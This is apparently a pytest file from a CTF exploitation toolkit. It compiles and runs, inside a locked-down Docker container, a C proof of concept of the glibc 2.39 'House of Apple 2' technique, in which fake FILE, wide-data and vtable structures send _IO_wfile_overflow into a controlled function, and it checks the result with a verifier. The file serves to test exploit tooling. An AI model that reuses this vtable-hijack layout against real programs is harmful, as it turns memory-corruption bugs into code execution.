"""Real glibc wide-vtable dispatch oracle for the Apple-2 verifier."""
from __future__ import annotations

import shutil
import subprocess
import textwrap
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
IMAGE = "csctf-pwn:1"


C_SOURCE = r"""
#include <assert.h>
#include <dlfcn.h>
#include <setjmp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

static unsigned char fake_file[0xe0] __attribute__((aligned(16)));
static unsigned char fake_wide[0xe8] __attribute__((aligned(16)));
static unsigned char fake_wide_vtable[0x70] __attribute__((aligned(16)));
static unsigned char fake_lock[0x10] __attribute__((aligned(16)));
static jmp_buf escape;
static volatile int dispatched;

static void put64(unsigned char *blob, size_t offset, uintptr_t value) {
    memcpy(blob + offset, &value, sizeof(value));
}

static int controlled_doallocate(void *fp) {
    (void)fp;
    dispatched = 1;
    longjmp(escape, 1);
}

static void dump(const char *name, const unsigned char *blob, size_t size) {
    printf("%s ", name);
    for (size_t i = 0; i < size; ++i) printf("%02x", blob[i]);
    putchar('\n');
}

int main(void) {
    void *outer = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    void *overflow_symbol = dlsym(RTLD_DEFAULT, "_IO_wfile_overflow");
    assert(outer != NULL && overflow_symbol != NULL);
    put64(fake_file, 0x88, (uintptr_t)fake_lock);
    put64(fake_file, 0xa0, (uintptr_t)fake_wide);
    int mode = 1;
    memcpy(fake_file + 0xc0, &mode, sizeof(mode));
    put64(fake_file, 0xd8, (uintptr_t)outer);
    put64(fake_wide, 0xe0, (uintptr_t)fake_wide_vtable);
    put64(fake_wide_vtable, 0x68, (uintptr_t)&controlled_doallocate);

    typedef wint_t (*overflow_fn)(void *, wint_t);
    if (setjmp(escape) == 0)
        ((overflow_fn)overflow_symbol)(fake_file, WEOF);
    assert(dispatched == 1);

    printf("META %lx %lx %lx %lx %lx %lx\n",
           (unsigned long)fake_file, (unsigned long)fake_wide,
           (unsigned long)fake_wide_vtable, (unsigned long)fake_lock,
           (unsigned long)outer, (unsigned long)&controlled_doallocate);
    dump("FILE", fake_file, sizeof(fake_file));
    dump("WIDE", fake_wide, sizeof(fake_wide));
    dump("JUMP", fake_wide_vtable, sizeof(fake_wide_vtable));
    dump("LOCK", fake_lock, sizeof(fake_lock));
    return 0;
}
"""


ORACLE = r"""
import ctypes
import subprocess
import sys

subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-fno-pie", "-no-pie",
     "-o", "fsop", "fsop.c", "-ldl"],
    check=True,
)
lines = subprocess.check_output(["./fsop"], text=True).splitlines()
meta = lines[0].split()
assert meta[0] == "META"
file_addr, wide_addr, jump_addr, lock_addr, outer, target = (
    int(item, 16) for item in meta[1:]
)
blobs = {}
for line in lines[1:]:
    name, encoded = line.split()
    blobs[name] = bytes.fromhex(encoded)

libc = ctypes.CDLL(None)
libc.gnu_get_libc_version.restype = ctypes.c_char_p
parts = libc.gnu_get_libc_version().decode().split(".")
version = ".".join(parts[:2])
assert 35 <= int(parts[1]) <= 41
assert version == "2.39", "the live FILE offsets below are profiled for csctf-pwn glibc 2.39"

sys.path.insert(0, "/repo/solvers/toolkits")
import pwndepth_fsop_verify as fsop

report = fsop.verify_apple2(
    glibc_version=version,
    trigger="direct_wfile_overflow",
    file_blob=blobs["FILE"],
    file_address=file_addr,
    lock_blob=blobs["LOCK"],
    wide_blob=blobs["WIDE"],
    wide_address=wide_addr,
    wide_vtable_blob=blobs["JUMP"],
    wide_vtable_address=jump_addr,
    io_wfile_jumps=outer,
    vtable_section_start=outer & ~0xfff,
    vtable_section_end=(outer & ~0xfff) + 0x1000,
    call_target=target,
    writable_ranges=(
        (file_addr, file_addr + len(blobs["FILE"])),
        (wide_addr, wide_addr + len(blobs["WIDE"])),
        (jump_addr, jump_addr + len(blobs["JUMP"])),
        (lock_addr, lock_addr + len(blobs["LOCK"])),
    ),
    executable_ranges=((target & ~0xfff, (target & ~0xfff) + 0x1000),),
    trigger_reachable=True,
    offsets=None,
)
assert report.call_target == target
assert report.io_wfile_jumps == outer
print("PWNDEPTH_FSOP_DOCKER_ORACLE_OK", version)
"""


def _docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    return subprocess.run(
        ["docker", "image", "inspect", IMAGE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    ).returncode == 0


def test_real_wfile_doallocate_dispatch_in_pwn_container(tmp_path: Path) -> None:
    if not _docker_ready():
        pytest.skip(f"local {IMAGE} image is unavailable")
    (tmp_path / "fsop.c").write_text(textwrap.dedent(C_SOURCE), encoding="utf-8")
    (tmp_path / "oracle.py").write_text(textwrap.dedent(ORACLE), encoding="utf-8")
    command = [
        "docker", "run", "--rm", "--platform", "linux/amd64",
        "--network", "none", "--read-only", "--cap-drop", "ALL",
        "--security-opt", "no-new-privileges", "--pids-limit", "128",
        "--memory", "512m", "--tmpfs", "/tmp:rw,noexec,nosuid,size=32m",
        "-v", f"{ROOT}:/repo:ro", "-v", f"{tmp_path}:/work:rw",
        "-w", "/work", IMAGE, "python3", "oracle.py",
    ]
    result = subprocess.run(command, capture_output=True, text=True, timeout=60, check=False)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "PWNDEPTH_FSOP_DOCKER_ORACLE_OK" in result.stdout
